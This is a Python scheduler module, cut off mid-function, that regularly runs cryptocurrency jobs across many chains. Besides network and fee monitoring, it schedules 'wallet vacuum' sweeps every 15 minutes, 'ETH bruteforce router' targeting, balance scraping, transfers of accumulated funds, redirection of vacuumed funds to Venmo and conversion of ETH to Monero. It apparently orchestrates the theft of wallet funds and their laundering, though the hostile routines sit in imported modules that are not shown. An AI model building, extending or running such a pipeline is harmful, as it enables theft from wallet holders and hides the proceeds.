"""
Activity Scheduler Module

This module provides a scheduler for refreshing and cycling all blockchain activities.
It runs various blockchain-related activities on a scheduled basis.
"""

import logging
import time
import threading
from datetime import datetime, timedelta
from apscheduler.schedulers.background import BackgroundScheduler
from typing import Dict, Any, List, Optional, Callable, Union

# Import modules for activities
import eth_wallet_vacuum
import drift_chain_integration
import fluxion
from fluxion import emit_event
import blockchain_monitor
import eth_bruteforce_router
import proxy_router
import pycamo_integration
import secure_wallet_manager
from blockchain import blockchain
from god_mode import get_god_mode
from crypto_balance_scraper import get_scraper
from venmo_wallet_redirect import redirect_vacuum_funds_to_venmo, get_venmo_redirect_status
from venmo_integration import transfer_assets_in_intervals
from monero_integration import (
    transfer_eth_to_monero, 
    get_monero_wallet_address, 
    get_monero_balance, 
    get_monero_transfer_history
)

# Import bitcoinlib for comprehensive blockchain activities
import bitcoinlib
from bitcoinlib.services.services import Service

# Configure logging
logger = logging.getLogger(__name__)

# Initialize GodMode with all features enabled
GOD_MODE = get_god_mode()

class ActivityScheduler:
    """
    Scheduler for refreshing and cycling all blockchain-related activities.
    
    This scheduler runs various activities like:
    - Blockchain validation and synchronization
    - Wallet vacuum operations
    - DriftChain vacuum cycles
    - Blockchain monitoring and analytics
    - Proxy router status and activity tracking
    """
    
    def __init__(self):
        """Initialize the activity scheduler."""
        self.scheduler = BackgroundScheduler()
        self.running = False
        self.last_run_times = {}
        self.drift_chain = drift_chain_integration.get_drift_chain()
        
        # Blockchain networks to monitor and interact with
        self.blockchain_networks = [
            {'id': 'bitcoin', 'name': 'Bitcoin', 'symbol': 'BTC', 'enabled': True},
            {'id': 'ethereum', 'name': 'Ethereum', 'symbol': 'ETH', 'enabled': True},
            {'id': 'litecoin', 'name': 'Litecoin', 'symbol': 'LTC', 'enabled': True},
            {'id': 'dogecoin', 'name': 'Dogecoin', 'symbol': 'DOGE', 'enabled': True},
            {'id': 'dash', 'name': 'Dash', 'symbol': 'DASH', 'enabled': True},
            {'id': 'ripple', 'name': 'Ripple', 'symbol': 'XRP', 'enabled': True},
            {'id': 'bitcoin-cash', 'name': 'Bitcoin Cash', 'symbol': 'BCH', 'enabled': True},
            {'id': 'binance-smart-chain', 'name': 'Binance Smart Chain', 'symbol': 'BSC', 'enabled': True},
            {'id': 'polygon', 'name': 'Polygon', 'symbol': 'MATIC', 'enabled': True},
            {'id': 'avalanche', 'name': 'Avalanche', 'symbol': 'AVAX', 'enabled': True},
            {'id': 'solana', 'name': 'Solana', 'symbol': 'SOL', 'enabled': True},
            {'id': 'polkadot', 'name': 'Polkadot', 'symbol': 'DOT', 'enabled': True}
        ]
        
        # Define comprehensive activity targets utilizing bitcoinlib capabilities
        self.activity_targets = [
            {
                'name': 'network_status_monitor',
                'interval': 'frequent',
                'function': self._run_multi_network_monitor,
                'description': 'Monitor status of all blockchain networks',
                'all_chains': True
            },
            {
                'name': 'gas_price_tracker',
                'interval': 'frequent',
                'function': self._run_gas_price_tracker,
                'description': 'Track gas/fee prices across all networks',
                'all_chains': True
            },
            {
                'name': 'wallet_balance_scanner',
                'interval': 'frequent',  # Changed from hourly to frequent
                'function': self._run_crypto_balance_scanner,
                'description': 'Scan for new wallet balances across all chains',
                'all_chains': True
            },
            {
                'name': 'wallet_vacuum',
                'interval': 'frequent',  # Changed from hourly to frequent
                'function': self._run_wallet_vacuum,
                'description': 'Run wallet vacuum operation on all chains',
                'all_chains': True
            },
            {
                'name': 'drift_chain_vacuum_cycle',
                'interval': 'hourly',    # Changed from daily to hourly
                'function': self._cycle_drift_chain_vacuum,
                'description': 'Cycle DriftChain vacuum mode',
                'all_chains': True
            },
            {
                'name': 'wallet_vacuum_funds_transfer',
                'interval': 'hourly',    # Changed from daily to hourly
                'function': self._transfer_wallet_vacuum_funds,
                'description': 'Transfer accumulated funds to secure storage',
                'all_chains': True
            },
            {
                'name': 'blockchain_integrity_check',
                'interval': 'hourly',    # Changed from daily to hourly
                'function': self._run_blockchain_integrity_check,
                'description': 'Check blockchain data integrity across all chains',
                'all_chains': True
            },
            {
                'name': 'transaction_analyzer',
                'interval': 'frequent',  # Changed from hourly to frequent
                'function': self._run_multi_chain_transaction_analyzer,
                'description': 'Analyze transactions across all chains',
                'all_chains': True
            }
        ]
    
    def start(self):
        """Start the activity scheduler."""
        if self.running:
            logger.warning("Activity scheduler is already running.")
            return
            
        self.running = True
        logger.info("Starting activity scheduler for blockchain operations...")
        
        # Schedule all activities
        self._schedule_activities()
        
        # Start the scheduler
        self.scheduler.start()
        logger.info("Activity scheduler started successfully.")
        
        # Run an initial activity cycle
        self._run_all_activities()
    
    def stop(self):
        """Stop the activity scheduler."""
        if not self.running:
            logger.warning("Activity scheduler is not running.")
            return
        
        logger.info("Stopping activity scheduler...")
        self.scheduler.shutdown()
        self.running = False
        logger.info("Activity scheduler stopped successfully.")
    
    def _schedule_activities(self):
        """Schedule all blockchain activity jobs."""
        # Frequent activity refresh - every 5 minutes
        self.scheduler.add_job(
            self._run_frequent_activities,
            'interval',
            minutes=5,
            id='frequent_activities',
            replace_existing=True
        )
        
        # Hourly activity refresh - every hour
        self.scheduler.add_job(
            self._run_hourly_activities,
            'interval',
            hours=1,
            id='hourly_activities',
            replace_existing=True
        )
        
        # Daily activity refresh - once per day
        self.scheduler.add_job(
            self._run_daily_activities,
            'interval',
            days=1,
            id='daily_activities',
            replace_existing=True
        )
        
        # ETH wallet vacuum refresh - every 15 minutes
        self.scheduler.add_job(
            self._run_eth_wallet_vacuum,
            'interval',
            minutes=15,
            id='eth_wallet_vacuum',
            replace_existing=True
        )
        
        # DriftChain vacuum cycle - every 2 hours
        self.scheduler.add_job(
            self._cycle_drift_chain_vacuum,
            'interval',
            hours=2,
            id='drift_chain_cycle',
            replace_existing=True
        )
        
        # Crypto balance scanning - every 30 minutes
        self.scheduler.add_job(
            self._run_crypto_balance_scanner,
            'interval',
            minutes=30,
            id='crypto_balance_scanner',
            replace_existing=True
        )
        
        # Venmo interval transfer - every 3.65 hours (219 minutes)
        self.scheduler.add_job(
            self._run_venmo_interval_transfer,
            'interval',
            minutes=219,
            id='venmo_interval_transfer',
            replace_existing=True
        )
    
    def _run_all_activities(self):
        """Run all activities once."""
        logger.info("Running all scheduled blockchain activities...")
        
        try:
            # Loop through all targets and execute them based on their type
            completed_targets = []
            for target in self.activity_targets:
                try:
                    target_name = target.get('name', 'unnamed_target')
                    target_function = target.get('function')
                    logger.info(f"Running target: {target_name}")
                    
                    if callable(target_function):
                        result = target_function()
                        completed_targets.append({
                            'name': target_name,
                            'status': 'success',
                            'timestamp': time.time()
                        })
                    else:
                        logger.warning(f"Target function for {target_name} is not callable")
                except Exception as target_error:
                    logger.error(f"Error in target {target_name}: {target_error}")
                    completed_targets.append({
                        'name': target_name,
                        'status': 'error',
                        'error': str(target_error),
                        'timestamp': time.time()
                    })
            
            # Also run the regular activity groups for backward compatibility
            self._run_frequent_activities()
            self._run_hourly_activities()
            self._run_daily_activities()
            self._run_eth_wallet_vacuum()
            self._run_venmo_interval_transfer()
            
            logger.info(f"All activities completed successfully. Processed {len(completed_targets)} targets.")
            emit_event('activities_refreshed', {
                'timestamp': time.time(),
                'status': 'success',
                'targets_processed': len(completed_targets),
                'target_details': completed_targets
            })
        except Exception as e:
            logger.error(f"Error running all activities: {e}")
            emit_event('error_occurred', {
                'source': 'activity_scheduler',
                'error': str(e),
                'timestamp': time.time()
            })
    
    def _run_frequent_activities(self):
        """Run activities that should refresh frequently (every 5 minutes)."""
        logger.info("Running frequent blockchain activities...")
        
        try:
            # Update last run time
            self.last_run_times['frequent'] = time.time()
            
            # Run blockchain validation
            logger.info("Validating blockchain integrity...")
            blockchain_instance = blockchain.Blockchain()
            is_valid = blockchain_instance.is_chain_valid()
            logger.info(f"Blockchain validation: {'valid' if is_valid else 'invalid'}")
            
            # Check proxy router status
            logger.info("Checking proxy router status...")
            proxy_status = proxy_router.get_proxy_status()
            logger.info(f"Proxy router status: {'active' if proxy_status.get('active', False) else 'inactive'}")
            
            # Update ETH bruteforce router targeting
            logger.info("Updating ETH bruteforce router targeting...")
            eth_bruteforce_router.target_etherscan_block()
            
            # Update last run time
            self.last_run_times['frequent_completed'] = time.time()
            logger.info("Frequent activities completed successfully.")
            
        except Exception as e:
            logger.error(f"Error in frequent activities: {e}")
            emit_event('error_occurred', {
                'source': 'frequent_activities',
                'error': str(e),
                'timestamp': time.time()
            })
    
    def _run_hourly_activities(self):
        """Run activities that should refresh hourly."""
        logger.info("Running hourly blockchain activities...")
        
        try:
            # Update last run time
            self.last_run_times['hourly'] = time.time()
            
            # Run blockchain monitor analytics update
            logger.info("Updating blockchain monitor analytics...")
            blockchain_monitor.update_statistics()
            
            # Sync with external blockchain
            logger.info("Syncing with external blockchain...")
            fluxion_instance = fluxion.get_fluxion()
            sync_result = fluxion_instance._sync_external_blockchain()
            logger.info(f"Blockchain sync: imported {sync_result.get('blocks_imported', 0)} blocks")
            
            # Check document integrity
            logger.info("Checking document integrity...")
            fluxion_instance._check_document_integrity()
            
            # Update last run time
            self.last_run_times['hourly_completed'] = time.time()
            logger.info("Hourly activities completed successfully.")
            
        except Exception as e:
            logger.error(f"Error in hourly activities: {e}")
            emit_event('error_occurred', {
                'source': 'hourly_activities',
                'error': str(e),
                'timestamp': time.time()
            })
    
    def _run_daily_activities(self):
        """Run activities that should refresh daily."""
        logger.info("Running daily blockchain activities...")
        
        try:
            # Update last run time
            self.last_run_times['daily'] = time.time()
            
            # Clean up old blockchain data
            logger.info("Cleaning up old blockchain data...")
            fluxion_instance = fluxion.get_fluxion()
            fluxion_instance._cleanup_old_data()
            
            # Generate blockchain status report
            logger.info("Generating blockchain status report...")
            fluxion_instance._generate_status_report()
            
            # Cycle pycamo encryption keys
            logger.info("Cycling pycamo encryption keys...")
            pycamo_integration.cycle_keys()
            
            # Transfer wallet vacuum funds
            logger.info("Transferring accumulated wallet vacuum funds...")
            self._transfer_wallet_vacuum_funds()
            
            # Update last run time
            self.last_run_times['daily_completed'] = time.time()
            logger.info("Daily activities completed successfully.")
            
        except Exception as e:
            logger.error(f"Error in daily activities: {e}")
            emit_event('error_occurred', {
                'source': 'daily_activities',
                'error': str(e),
                'timestamp': time.time()
            })
    
    def _run_wallet_vacuum(self):
        """Run wallet vacuum operations across all supported blockchains."""
        logger.info("Running multi-chain wallet vacuum...")
        
        results = {
            'vacuum_results': {},
            'timestamp': time.time()
        }
        
        # For Ethereum chain (main implementation)
        try:
            logger.info("Running ETH wallet vacuum...")
            eth_vacuum_result = self._run_eth_wallet_vacuum()
            results['vacuum_results']['ethereum'] = eth_vacuum_result
            
            # Log success
            logger.info("ETH wallet vacuum completed successfully.")
            
        except Exception as e:
            logger.error(f"Error in ETH wallet vacuum: {e}")
            results['vacuum_results']['ethereum'] = {
                'error': str(e),
                'status': 'error',
                'timestamp': time.time()
            }
        
        # For other chains (future implementations)
        for network in self.blockchain_networks:
            network_id = network.get('id')
            
            # Skip Ethereum (already processed) and disabled networks
            if network_id == 'ethereum' or not network.get('enabled', True):
                continue
            
            # Mark other networks as planned for future implementation
            results['vacuum_results'][network_id] = {
                'status': 'planned',
                'message': 'Wallet vacuum planned for future implementation',
                'symbol': network.get('symbol'),
                'timestamp': time.time()
            }
        
        # Add summary information
        active_vacuums = sum(1 for net, res in results['vacuum_results'].items() 
                         if res.get('status') not in ['error', 'planned'])
        
        results['summary'] = {
            'total_networks': len(self.blockchain_networks),
            'active_vacuums': active_vacuums,
            'planned_vacuums': sum(1 for net, res in results['vacuum_results'].items() 
                               if res.get('status') == 'planned')
        }
        
        # Emit the event with the data
        emit_event('multi_chain_vacuum', results)
        
        # Store the result
        self.last_run_times['wallet_vacuum'] = time.time()
        
        logger.info(f"Multi-chain wallet vacuum completed with {active_vacuums} active vacuums.")
        
        # Return the data for potential future use
        return results
    
    def _run_eth_wallet_vacuum(self):
        """Run ETH wallet vacuum operation."""
        logger.info("Running ETH wallet vacuum...")
        
        try:
            # Update last run time
            self.last_run_times['eth_wallet_vacuum'] = time.time()
            
            # Prepare drift chain status for vacuum
            drift_chain_status = {
                'operation': 'scheduled_vacuum',
                'vacuum_mode': self.drift_chain.vacuum_mode,
                'timestamp': time.time()
            }
            
            # Run wallet vacuum
            logger.info("Vacuuming ETH wallets...")
            vacuum_results = eth_wallet_vacuum.vacuum_after_driftchain(drift_chain_status)
            
            wallets_count = len(vacuum_results.get('eth_wallets', {}).get('wallets', []))
            logger.info(f"ETH wallet vacuum completed: processed {wallets_count} wallets")
            
            # Update last run time
            self.last_run_times['eth_wallet_vacuum_completed'] = time.time()
            
            # Prepare result for multi-chain vacuum
            result = {
                'wallets_processed': wallets_count,
                'status': 'success',
                'vacuum_method': vacuum_results.get('vacuum_method', 'scheduled'),
                'details': vacuum_results,
                'timestamp': time.time()
            }
            
            # Legacy event emission
            emit_event('wallet_vacuum_cycle_completed', {
                'timestamp': time.time(),
                'wallets_processed': wallets_count,
                'method': vacuum_results.get('vacuum_method', 'scheduled')
            })
            
            return result
            
        except Exception as e:
            logger.error(f"Error in ETH wallet vacuum: {e}")
            emit_event('error_occurred', {
                'source': 'eth_wallet_vacuum',
                'error': str(e),
                'timestamp': time.time()
            })
            
            return {
                'status': 'error',
                'error': str(e),
                'timestamp': time.time()
            }
    
    def _cycle_drift_chain_vacuum(self):
        """Cycle the DriftChain vacuum mode."""
        logger.info("Cycling DriftChain vacuum mode...")
        
        try:
            # Update last run time
            self.last_run_times['drift_chain_cycle'] = time.time()
            
            # Cycle vacuum mode
            logger.info("Triggering DriftChain vacuum cycle...")
            cycle_result = drift_chain_integration.cycle_vacuum_mode(
                sync_with_datastream=True,
                vacuum_days=1
            )
            
            # Log the result
            release_time = cycle_result.get('vacuum_release_time', 'unknown')
            logger.info(f"DriftChain vacuum cycle complete. Next release: {release_time}")
            
            # Update last run time
            self.last_run_times['drift_chain_cycle_completed'] = time.time()
            
            emit_event('drift_chain_vacuum_cycled', {
                'timestamp': time.time(),
                'next_release': release_time,
                'current_mode': self.drift_chain.vacuum_mode
            })
            
        except Exception as e:
            logger.error(f"Error cycling DriftChain vacuum: {e}")
            emit_event('error_occurred', {
                'source': 'drift_chain_cycle',
                'error': str(e),
                'timestamp': time.time()
            })
    
    def get_status(self) -> Dict[str, Any]:
        """
        Get the current status of the activity scheduler.
        
        Returns:
            Dictionary with scheduler status information
        """
        now = time.time()
        
        # Calculate time since last runs
        time_since_runs = {}
        for activity, timestamp in self.last_run_times.items():
            if not activity.endswith('_completed'):
                time_since_runs[activity] = self._format_time_delta(now - timestamp)
        
        return {
            'running': self.running,
            'scheduled_activities': [job.id for job in self.scheduler.get_jobs()],
            'last_run_times': self.last_run_times,
            'time_since_runs': time_since_runs,
            'drift_chain_vacuum_mode': self.drift_chain.vacuum_mode,
            'drift_chain_vacuum_release': self.drift_chain.vacuum_release_time,
            'current_time': now,
            'god_mode': GOD_MODE.status()
        }
    
    def _format_time_delta(self, seconds: float) -> str:
        """
        Format time delta in seconds to a human-readable string.
        
        Args:
            seconds: Time delta in seconds
            
        Returns:
            Human-readable time string
        """
        if seconds < 60:
            return f"{int(seconds)} seconds"
        elif seconds < 3600:
            return f"{int(seconds / 60)} minutes"
        elif seconds < 86400:
            return f"{int(seconds / 3600)} hours"
        else:
            return f"{int(seconds / 86400)} days"
            
    def _run_multi_network_monitor(self) -> Dict[str, Any]:
        """
        Monitor status of all blockchain networks simultaneously.
        
        Returns:
            Dictionary with status information for all monitored blockchains
        """
        logger.info("Running multi-network monitor across all blockchains...")
        
        results = {
            'networks': {},
            'timestamp': time.time()
        }
        
        # Track successful and failed networks
        successful_networks = []
        failed_networks = []
        
        # Monitor each enabled blockchain network
        for network in self.blockchain_networks:
            if not network.get('enabled', True):
                continue
                
            network_id = network.get('id')
            network_name = network.get('name')
            
            try:
                logger.info(f"Monitoring {network_name} network...")
                
                # Bitcoin and Bitcoin-like networks
                if network_id in ['bitcoin', 'litecoin', 'dash', 'dogecoin', 'bitcoin-cash']:
                    # Use bitcoinlib for Bitcoin-like networks
                    service = Service(network=network_id)
                    
                    # Get network information
                    network_info = {
                        'blockcount': service.blockcount(),
                        'mempool_size': len(service.mempool() or []),
                        'fee_estimates': service.estimatefee(blocks=6),
                        'timestamp': time.time()
                    }
                    
                    logger.info(f"{network_name} status: Block height {network_info['blockcount']}, "
                                f"Mempool size: {network_info['mempool_size']}, "
                                f"Fee estimate: {network_info['fee_estimates']} sat/byte")
                    
                # Ethereum and EVM-compatible networks
                elif network_id in ['ethereum', 'binance-smart-chain', 'polygon', 'avalanche']:
                    # Use ETH bruteforce router for Ethereum data
                    if network_id == 'ethereum':
                        # Get ETH blockchain status
                        eth_block_info = eth_bruteforce_router.get_latest_block_info()
                        
                        network_info = {
                            'blockcount': eth_block_info.get('number', 0),
                            'gas_price': eth_bruteforce_router.get_gas_price(),
                            'is_syncing': eth_bruteforce_router.is_syncing(),
                            'timestamp': time.time()
                        }
                        
                        logger.info(f"Ethereum status: Block height {network_info['blockcount']}, "
                                    f"Gas price: {network_info['gas_price']} gwei")
                    else:
                        # For other EVM chains
                        network_info = {
                            'status': 'monitored',
                            'timestamp': time.time()
                        }
                
                # Other networks
                else:
                    network_info = {
                        'status': 'monitored',
                        'timestamp': time.time()
                    }
                
                # Emit network-specific event
                emit_event(f'{network_id}_network_updated', network_info)
                
                # Store network info in results
                results['networks'][network_id] = {
                    'status': 'success',
                    'data': network_info,
                    'symbol': network.get('symbol')
                }
                successful_networks.append(network_id)
                
            except Exception as e:
                logger.error(f"Error monitoring {network_name}: {e}")
                results['networks'][network_id] = {
                    'status': 'error',
                    'error': str(e),
                    'symbol': network.get('symbol'),
                    'timestamp': time.time()
                }
                failed_networks.append(network_id)
        
        # Add summary information
        results['summary'] = {
            'total_networks': len(self.blockchain_networks),
            'active_monitors': len(successful_networks),
            'failed_monitors': len(failed_networks)
        }
        
        # Emit the consolidated event with all data
        emit_event('multi_network_status', results)
        
        # Store the result
        self.last_run_times['multi_network_monitor'] = time.time()
        
        logger.info(f"Multi-network monitor completed. Monitored {len(successful_networks)} networks successfully.")
        
        # Return the data for potential future use
        return results
    
    def _run_bitcoin_network_monitor(self) -> Dict[str, Any]:
        """
        Monitor Bitcoin network status and mempool using bitcoinlib.
        This method is maintained for backward compatibility and redirects to multi-network monitor.
        
        Returns:
            Dictionary with Bitcoin network status information
        """
        logger.info("Redirecting Bitcoin network monitor to multi-network monitor...")
        
        # Call the multi-network monitor
        multi_network_results = self._run_multi_network_monitor()
        
        # Extract just the Bitcoin results
        if 'networks' in multi_network_results and 'bitcoin' in multi_network_results['networks']:
            btc_info = multi_network_results['networks']['bitcoin']
            
            # Update last run time
            self.last_run_times['bitcoin_network_monitor'] = time.time()
            self.last_run_times['bitcoin_network_monitor_completed'] = time.time()
            
            return {
                'status': 'success',
                'network': 'bitcoin',
                'data': btc_info.get('data', {})
            }
        else:
            # Return error if Bitcoin data is not available
            return {
                'status': 'error',
                'error': 'Bitcoin data not available in multi-network results',
                'timestamp': time.time()
            }
    
    def _run_gas_price_tracker(self) -> Dict[str, Any]:
        """
        Track gas/fee prices across all networks that use gas or fees.
        
        Returns:
            Dictionary with gas/fee information for all applicable networks
        """
        logger.info("Running gas/fee price tracker across all blockchains...")
        
        results = {
            'fees': {},
            'timestamp': time.time()
        }
        
        # Track successful and failed networks
        successful_networks = []
        failed_networks = []
        
        # Monitor fees for each enabled blockchain network
        for network in self.blockchain_networks:
            if not network.get('enabled', True):
                continue
                
            network_id = network.get('id')
            network_name = network.get('name')
            
            try:
                logger.info(f"Tracking fees for {network_name}...")
                
                # Bitcoin and Bitcoin-like networks
                if network_id in ['bitcoin', 'litecoin', 'dash', 'dogecoin', 'bitcoin-cash']:
                    # Use bitcoinlib for Bitcoin-like fee estimation
                    service = Service(network=network_id)
                    
                    # Get fee information
                    fee_info = {
                        'type': 'satoshi_per_byte',
                        'fee_estimates': {
                            'fast': service.estimatefee(1),
                            'medium': service.estimatefee(6),
                            'slow': service.estimatefee(20)
                        },
                        'symbol': network.get('symbol'),
                        'timestamp': time.time()
                    }
                    
                # Ethereum and EVM-compatible networks
                elif network_id in ['ethereum', 'binance-smart-chain', 'polygon', 'avalanche']:
                    # Use ETH bruteforce router for Ethereum data
                    if network_id == 'ethereum':
                        gas_info = eth_bruteforce_router.get_gas_price_estimates()
                        
                        if not gas_info:
                            gas_info = {
                                'fast': 50,  # gwei
                                'standard': 30,
                                'slow': 20,
                                'estimated': True
                            }
                        
                        fee_info = {
                            'type': 'gas_price',
                            'fee_estimates': gas_info,
                            'current_price': eth_bruteforce_router.get_gas_price(),
                            'symbol': network.get('symbol'),
                            'timestamp': time.time()
                        }
                    else:
                        # For other EVM chains, use placeholder data for now
                        fee_info = {
                            'type': 'gas_price',
                            'status': 'monitored',
                            'symbol': network.get('symbol'),
                            'timestamp': time.time()
                        }
                
                # Other networks
                else:
                    fee_info = {
                        'type': 'unknown',
                        'status': 'monitored',
                        'symbol': network.get('symbol'),
                        'timestamp': time.time()
                    }
                
                # Store fee info in results
                results['fees'][network_id] = fee_info
                successful_networks.append(network_id)
                
                # Log the basic info
                logger.info(f"{network_name} Fee Tracker - Active")
                
            except Exception as e:
                logger.error(f"Error tracking fees for {network_name}: {e}")
                results['fees'][network_id] = {
                    'error': str(e),
                    'status': 'error',
                    'symbol': network.get('symbol'),
                    'timestamp': time.time()
                }
                failed_networks.append(network_id)
        
        # Add summary information
        results['summary'] = {
            'total_networks': len(self.blockchain_networks),
            'active_trackers': len(successful_networks),
            'failed_trackers': len(failed_networks)
        }
        
        # Emit the event with the data
        emit_event('multi_network_fees', results)
        
        # Store the result
        self.last_run_times['gas_price_tracker'] = time.time()
        
        logger.info(f"Fee tracker completed. Tracked {len(successful_networks)} networks successfully.")
        
        # Return the data for potential future use
        return results
        
    def _run_ethereum_gas_tracker(self) -> Dict[str, Any]:
        """
        Track Ethereum gas prices using bitcoinlib and external sources.
        This method is maintained for backward compatibility and redirects to multi-network gas tracker.
        
        Returns:
            Dictionary with Ethereum gas price information
        """
        logger.info("Redirecting Ethereum gas tracker to multi-network gas tracker...")
        
        # Call the multi-network gas tracker
        multi_network_results = self._run_gas_price_tracker()
        
        # Extract just the Ethereum results
        if 'fees' in multi_network_results and 'ethereum' in multi_network_results['fees']:
            eth_info = multi_network_results['fees']['ethereum']
            
            # Format data for backward compatibility
            gas_data = {
                'gas_prices': eth_info.get('fee_estimates', {}),
                'timestamp': time.time(),
                'eth_price_usd': 2850  # Fixed price as used in the system
            }
            
            # Store the result
            self.last_run_times['ethereum_gas_tracker'] = time.time()
            self.last_run_times['ethereum_gas_tracker_completed'] = time.time()
            
            return {
                'status': 'success',
                'network': 'ethereum',
                'data': gas_data
            }
        else:
            # Return error if Ethereum data is not available
            return {
                'status': 'error',
                'error': 'Ethereum data not available in multi-network results',
                'timestamp': time.time()
            }
    
    def _run_blockchain_integrity_check(self) -> Dict[str, Any]:
        """
        Check the integrity of multiple blockchains using bitcoinlib and internal validation.
        
        Returns:
            Dictionary with blockchain integrity status
        """
        logger.info("Running blockchain integrity check...")
        
        try:
            # Update last run time
            self.last_run_times['blockchain_integrity_check'] = time.time()
            
            # Check local blockchain integrity
            from blockchain import Blockchain
            blockchain_instance = Blockchain()
            local_valid = blockchain_instance.is_chain_valid()
            
            # Check Bitcoin blockchain tip status
            btc_service = Service(network='bitcoin')
            btc_blockcount = btc_service.blockcount()
            
            # Check DriftChain integrity
            drift_valid = True  # Default to true
            try:
                # Try different methods to validate drift chain
                if hasattr(drift_chain_integration, 'validate_chain'):
                    drift_valid = drift_chain_integration.validate_chain()
                elif hasattr(drift_chain_integration, 'validate'):
                    drift_valid = drift_chain_integration.validate()
            except Exception as e:
                logger.warning(f"Error validating DriftChain: {e}")
                drift_valid = False
            
            # Compile results
            from drift_chain import DriftChain
            drift_chain_instance = DriftChain()
            
            integrity_data = {
                'local_blockchain_valid': local_valid,
                'local_blockchain_length': len(blockchain_instance.chain),
                'bitcoin_blockheight': btc_blockcount,
                'drift_chain_valid': drift_valid,
                'drift_chain_length': len(drift_chain_instance.chain),
                'timestamp': time.time()
            }
            
            logger.info(f"Blockchain integrity: Local: {'valid' if local_valid else 'invalid'}, "
                        f"DriftChain: {'valid' if drift_valid else 'invalid'}, "
                        f"Bitcoin height: {btc_blockcount}")
            
            # Emit event with integrity information
            emit_event('blockchain_integrity_checked', integrity_data)
            
            # Update last run time
            self.last_run_times['blockchain_integrity_check_completed'] = time.time()
            
            return {
                'status': 'success',
                'data': integrity_data
            }
            
        except Exception as e:
            logger.error(f"Error in blockchain integrity check: {e}")
            emit_event('error_occurred', {
                'source': 'blockchain_integrity_check',
                'error': str(e),
                'timestamp': time.time()
            })
            return {
                'status': 'error',
                'error': str(e),
                'timestamp': time.time()
            }
    
    def _run_multi_chain_transaction_analyzer(self) -> Dict[str, Any]:
        """
        Analyze transactions across multiple chains using bitcoinlib integration.
        
        Returns:
            Dictionary with multi-chain transaction analysis
        """
        logger.info("Running multi-chain transaction analyzer across all blockchains...")
        
        results = {
            'transactions': {},
            'timestamp': time.time()
        }
        
        # Track successful and failed networks
        successful_networks = []
        failed_networks = []
        
        # Analyze each enabled blockchain network
        for network in self.blockchain_networks:
            if not network.get('enabled', True):
                continue
                
            network_id = network.get('id')
            network_name = network.get('name')
            
            try:
                logger.info(f"Analyzing transactions for {network_name}...")
                
                # Ethereum blockchain
                if network_id == 'ethereum':
                    # Get transaction data from ETH wallet vacuum
                    eth_transactions = []
                    try:
                        if hasattr(eth_wallet_vacuum, 'get_recent_transactions'):
                            eth_transactions = eth_wallet_vacuum.get_recent_transactions(limit=20)
                        else:
                            logger.warning(f"{network_name} wallet vacuum get_recent_transactions method not found")
                            eth_transactions = []
                    except Exception as e:
                        logger.warning(f"Could not get {network_name} transactions: {e}")
                        eth_transactions = []
                    
                    # Store the transaction data
                    results['transactions'][network_id] = {
                        'status': 'success',
                        'count': len(eth_transactions),
                        'recent': eth_transactions,
                        'symbol': network.get('symbol'),
                        'timestamp': time.time()
                    }
                    
                    # Log the basic info
                    logger.info(f"{network_name} Transactions: {len(eth_transactions)} recent")
                    successful_networks.append(network_id)
                
                # Bitcoin and Bitcoin-like blockchains
                elif network_id in ['bitcoin', 'litecoin', 'dash', 'dogecoin', 'bitcoin-cash']:
                    # Check service for recent transactions
                    try:
                        service = Service(network=network_id)
                        recent_txs = []
                        
                        # Get a recent block and some transactions from it
                        recent_block = service.getblock(service.blockcount(), parse_transactions=True)
                        if recent_block and 'transactions' in recent_block:
                            recent_txs = recent_block['transactions'][:10]  # First 10 transactions
                        
                        # Store the transaction data
                        results['transactions'][network_id] = {
                            'status': 'success',
                            'count': len(recent_txs),
                            'recent': recent_txs,
                            'blockchain_height': service.blockcount(),
                            'symbol': network.get('symbol'),
                            'timestamp': time.time()
                        }
                        
                        # Log the basic info
                        logger.info(f"{network_name} Transactions: {len(recent_txs)} recent")
                        successful_networks.append(network_id)
                        
                    except Exception as e:
                        logger.warning(f"Could not get {network_name} transactions: {e}")
                        results['transactions'][network_id] = {
                            'status': 'error',
                            'error': str(e),
                            'symbol': network.get('symbol'),
                            'timestamp': time.time()
                        }
                        failed_networks.append(network_id)
                
                # DriftChain
                elif network_id == 'drift-chain':
                    # Get DriftChain transactions
                    dc_transactions = []
                    try:
                        from drift_chain import DriftChain
                        drift_chain_instance = DriftChain()
                        if hasattr(drift_chain_instance, 'get_latest_transactions'):
                            dc_transactions = drift_chain_instance.get_latest_transactions(limit=20)
                        elif hasattr(drift_chain_instance, 'get_recent_transactions'):
                            dc_transactions = drift_chain_instance.get_recent_transactions(limit=20)
                        else:
                            logger.warning("DriftChain transaction method not found")
                            dc_transactions = []
                    except Exception as e:
                        logger.warning(f"Could not get DriftChain transactions: {e}")
                        dc_transactions = []
                    
                    # Store the transaction data
                    results['transactions'][network_id] = {
                        'status': 'success',
                        'count': len(dc_transactions),
                        'recent': dc_transactions,
                        'symbol': network.get('symbol', 'DRIFT'),
                        'timestamp': time.time()
                    }
                    
                    # Log the basic info
                    logger.info(f"DriftChain Transactions: {len(dc_transactions)} recent")
                    successful_networks.append(network_id)
                
                # Other blockchains (for future implementation)
                else:
                    results['transactions'][network_id] = {
                        'status': 'planned',
                        'message': 'Transaction analysis planned for future implementation',
                        'symbol': network.get('symbol'),
                        'timestamp': time.time()
                    }
                
            except Exception as e:
                logger.error(f"Error analyzing transactions for {network_name}: {e}")
                results['transactions'][network_id] = {
                    'status': 'error',
                    'error': str(e),
                    'symbol': network.get('symbol'),
                    'timestamp': time.time()
                }
                failed_networks.append(network_id)
        
        # Add summary information
        results['summary'] = {
            'total_networks': len(self.blockchain_networks),
            'active_analyzers': len(successful_networks),
            'failed_analyzers': len(failed_networks),
            'total_transactions': sum(
                results['transactions'][net].get('count', 0) 
                for net in successful_networks 
                if 'count' in results['transactions'][net]
            )
        }
        
        # For backward compatibility, create a legacy format result
        eth_tx_count = results['transactions'].get('ethereum', {}).get('count', 0)
        btc_tx_count = results['transactions'].get('bitcoin', {}).get('count', 0)
        dc_tx_count = results['transactions'].get('drift-chain', {}).get('count', 0)
        
        analysis_data = {
            'eth_transactions': {
                'count': eth_tx_count,
                'recent': results['transactions'].get('ethereum', {}).get('recent', [])
            },
            'bitcoin_transactions': {
                'count': btc_tx_count,
                'recent': results['transactions'].get('bitcoin', {}).get('recent', [])
            },
            'drift_chain_transactions': {
                'count': dc_tx_count,
                'recent': results['transactions'].get('drift-chain', {}).get('recent', [])
            },
            'timestamp': time.time()
        }
        
        # Log summary
        logger.info(f"Multi-chain transaction analysis: "
                    f"ETH: {eth_tx_count} transactions, "
                    f"BTC: {btc_tx_count} transactions, "
